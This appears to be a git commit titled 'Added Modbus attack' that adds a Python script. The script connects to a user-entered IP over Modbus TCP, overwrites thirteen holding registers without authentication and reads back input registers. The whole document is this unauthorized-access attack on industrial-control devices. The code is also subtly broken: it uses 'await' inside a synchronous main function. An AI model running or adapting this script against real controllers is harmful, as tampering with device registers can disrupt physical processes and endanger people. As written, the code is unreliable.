a9cf4abfa89cac885ee074d7e6b2b7df925f58a1
Molty <fire_4u@protonmail.com>
2023-11-27 20:32:48 +0100

    Added Modbus attack

---
+++ modbus/unauthorized_access/edit_regs.py
@@ -0,0 +1,50 @@
+from pymodbus.framer import ModbusSocketFramer
+import pymodbus.client as ModbusClient
+from pymodbus.exceptions import ModbusException
+
+
+class ClientArgs:
+    def __init__(self, host="127.0.0.1"):
+        self.baudrate = 9600
+        self.comm = 'tcp'
+        self.framer = ModbusSocketFramer
+        self.host = host
+        self.log = 'INFO'
+        self.port = 5020
+        self.timeout = 10
+
+
+def main():
+
+    host = input("Type IP: ")
+
+    args = ClientArgs(host)
+    print("### Create client object")
+    client = ModbusClient.AsyncModbusTcpClient(
+        args.host,
+        port=args.port,
+        framer=args.framer,
+        timeout=args.timeout,
+        retries=3,
+        reconnect_delay=1,
+        reconnect_delay_max=10,
+    )
+
+    await client.connect()
+    assert client.connected
+    try:
+        await client.write_registers(address=0x10, values=13 * [40])
+        request = await client.read_input_registers(address=0x00, count=96)
+        print(request.registers)
+
+    except ModbusException as exc:
+        print("### ERROR ###")
+        print("### RECEIVING DEVICE INFORMATION FAILED! ###")
+        print(exc.string)
+    finally:
+        client.close(reconnect=False)
+        print("### End of Program")
+
+
+if __name__ == "__main__":
+    main()
